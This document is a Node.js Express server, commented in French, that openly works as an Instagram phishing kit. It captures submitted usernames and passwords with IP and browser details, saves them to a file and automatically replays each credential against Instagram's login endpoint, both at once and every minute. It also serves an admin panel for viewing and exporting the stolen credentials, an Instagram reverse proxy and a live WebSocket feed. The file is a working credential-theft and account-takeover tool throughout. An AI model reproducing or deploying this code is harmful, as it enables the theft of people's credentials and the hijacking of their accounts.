const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const app = express();
const port = 443;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Base de données locale des identifiants capturés
const credentialsFile = path.join(__dirname, 'credentials.json');

// Stockage des logs d'accès
const accessLogFile = path.join(__dirname, 'access_log.json');

// Fonction de stockage des identifiants
function storeCredentials(data) {
    let credentials = [];
    if (fs.existsSync(credentialsFile)) {
        credentials = JSON.parse(fs.readFileSync(credentialsFile, 'utf8'));
    }
    credentials.push({
        username: data.username,
        password: data.password,
        ip: data.ip || 'unknown',
        userAgent: data.userAgent || 'unknown',
        country: data.country || 'unknown',
        timestamp: new Date().toISOString(),
        session_id: generateSessionId()
    });
    fs.writeFileSync(credentialsFile, JSON.stringify(credentials, null, 2));
    return credentials[credentials.length - 1];
}

// Génération d'ID de session
function generateSessionId() {
    return require('crypto').randomBytes(16).toString('hex');
}

// Endpoint de capture principal
app.post('/capture', async (req, res) => {
    const credentialData = {
        username: req.body.username || req.body.email || '',
        password: req.body.password || '',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown',
        acceptLanguage: req.headers['accept-language'] || 'unknown',
        referer: req.headers['referer'] || 'unknown',
        country: await getCountry(req.connection.remoteAddress),
        timestamp: new Date().toISOString()
    };

    const stored = storeCredentials(credentialData);

    // Tentative automatique d'utilisation des creds sur Instagram
    attemptInstagramLogin(credentialData.username, credentialData.password)
        .then(result => {
            console.log(`[LOGIN_ATTEMPT] ${stored.username} - ${result.status}`);
        })
        .catch(err => {
            console.log(`[LOGIN_FAILED] ${stored.username} - ${err.message}`);
        });

    res.status(200).sendFile(path.join(__dirname, 'public', 'redirect.html'));
});

// Tentative de connexion automatique à Instagram
async function attemptInstagramLogin(username, password) {
    try {
        const session = axios.create({
            baseURL: 'https://www.instagram.com',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Referer': 'https://www.instagram.com/accounts/login/'
            },
            withCredentials: true
        });

        // Récupération du CSRFToken
        const loginPage = await session.get('/accounts/login/');
        const csrfToken = extractCSRFToken(loginPage.data);

        // Tentative de connexion
        const loginResponse = await session.post('/accounts/login/', null, {
            params: {
                username: username,
                enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${btoa(password)}`,
                queryParams: {},
                optIntoOneTap: 'false'
            },
            headers: {
                'x-csrftoken': csrfToken,
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR3At9HrN3K5H0Wg7DLu6MqqKvL0B08C2yK5f0z',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
               });

        if (loginResponse.status === 200 || loginResponse.status === 302) {
            return { status: 'success', session_cookies: session.cookies };
        }
        return { status: 'failed', response: loginResponse.data };
    } catch (error) {
        if (error.response) {
            return { status: 'failed', response: error.response.data };
        }
        return { status: 'error', message: error.message };
    }
}

// Extraction du CSRFToken depuis le HTML
function extractCSRFToken(html) {
    const regex = /name="csrfmiddlewaretoken" content="([^"]+)"/;
    const match = html.match(regex);
    if (match) return match[1];
    const regex2 = /"csrfToken":"([^"]+)"/;
    const match2 = html.match(regex2);
    return match2 ? match2[1] : 'default_csrf_token';
}

// Géolocalisation IP
async function getCountry(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        return response.data.country || 'unknown';
    } catch {
        return 'unknown';
    }
}

// Endpoint de statistiques
app.get('/admin/stats', (req, res) => {
    let data = [];
    if (fs.existsSync(credentialsFile)) {
        data = JSON.parse(fs.readFileSync(credentialsFile, 'utf8'));
    }
    res.json({
        total_captured: data.length,
        credentials: data,
        server_uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Endpoint de téléchargement des données
app.get('/admin/export', (req, res) => {
    if (fs.existsSync(credentialsFile)) {
        res.download(credentialsFile, 'captured_credentials.json');
    } else {
        res.status(404).send('No data captured yet.');
    }
});

// Endpoint de suppression des données
app.post('/admin/clear', (req, res) => {
    fs.writeFileSync(credentialsFile, '[]');
    res.json({ status: 'cleared' });
});

// Endpoint de redirection post-capture
app.get('/redirect', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'redirect.html'));
});

// Gestion du proxy inverse vers Instagram
app.all('/instagram/*', async (req, res) => {
    try {
        const targetUrl = `https://www.instagram.com/${req.params[0]}`;
        const response = await axios({
            method: req.method,
            url: targetUrl,
            headers: { ...req.headers, host: 'www.instagram.com' },
            data: req.body,
            withCredentials: true
        });
        res.status(response.status).send(response.data);
    } catch (error) {
        res.status(500).send('Proxy error');
    }
});

// Page de phishing principale
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Page de redirection après capture
app.get('/redirect.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'redirect.html'));
});

// WebSocket pour notifications temps réel
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws) => {
    console.log('[WS] Admin connected');
    ws.on('close', () => console.log('[WS] Admin disconnected'));
});

// Broadcast des nouvelles captures
function broadcastCredential(cred) {
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'new_credential', data: cred }));
        }
    });
}

// Démarrage du serveur
app.listen(port, () => {
    console.log(`[PHISH_SERVER] Running on port ${port}`);
    console.log(`[ADMIN] http://localhost:443/admin/stats`);
    console.log(`[WS] ws://localhost:8080`);
});

// Processus de reconnexion automatique
setInterval(() => {
    if (fs.existsSync(credentialsFile)) {
        const creds = JSON.parse(fs.readFileSync(credentialsFile, 'utf8'));
        creds.forEach(async (cred) => {
            const result = await attemptInstagramLogin(cred.username, cred.password);
            if (result.status === 'success') {
                console.log(`[AUTO_LOGIN_SUCCESS] ${cred.username}`);
            }
        });
    }
}, 60000);

// Gestion des erreurs non capturées
process.on('uncaughtException', (err) => {
    console.error('[CRASH]', err.message);
    fs.appendFileSync('error_log.txt', `${new Date().toISOString()} - ${err.message}\n`);
});

process.on('unhandledRejection', (reason) => {
    console.error('[UNHANDLED]', reason);
});